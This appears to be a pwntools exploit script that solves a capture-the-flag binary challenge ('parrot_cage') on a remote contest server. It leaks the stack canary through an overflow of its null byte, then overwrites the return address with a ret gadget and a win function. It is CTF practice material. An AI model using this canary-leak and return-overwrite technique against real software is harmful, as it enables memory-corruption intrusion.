#!/usr/bin/env python3
from pwn import *
#context.log_level = 'debug'
context.binary = elf = ELF('./parrot_cage', checksec=False)
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP =OFFSET_TO_CANARY + 8 + 8
ret_gadget = 0x4011af
win=0x401235
REMOTE_HOST,HOST_PORT= 'offsec.m0lecon.it', 13534
"""
BUFFER[64]
.....
CANARY[8]
RBP[8]
RET <-- target  
"""
#p = process(elf.path)
p= remote(REMOTE_HOST,HOST_PORT)
#p = process(elf.path, env={"FLAG": "ls"})

p.recv()

#1)Read the canary using the gets(with pwntools), since GETS() function block the read when reach a terminator value (like \x00) we also overwrite the first byte of the canary , this allow to the gets() to read the remaing 7 byte of the canary.
#After we reconstruct the canary with the \x00 value we package it into an integer.
payload = flat(b"A"*(OFFSET_TO_CANARY+1))
p.send(payload)
draft_canary=p.recv()

#data=p.recvline()
#data = p.recv(timeout=1)
#canary = data[-7:]

log.info(f"DRAFT CANARY-> {draft_canary}")
canary =u64( b'\x00' +draft_canary[73:73+7],"little")
log.info(f"CANARY-> {p64(canary,'little')}")


#2) Now we construct the "real" payload


payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary,"little"),
    b"B" * 8,               #RBP
    p64(ret_gadget),        # ret gadget for alignment
    p64(elf.sym.win),       #win function
)

p.send(payload)

p.sendline(b"bye")
p.recvline()

p.sendline(b"bye")
print(p.recvline())
#p.interactive()
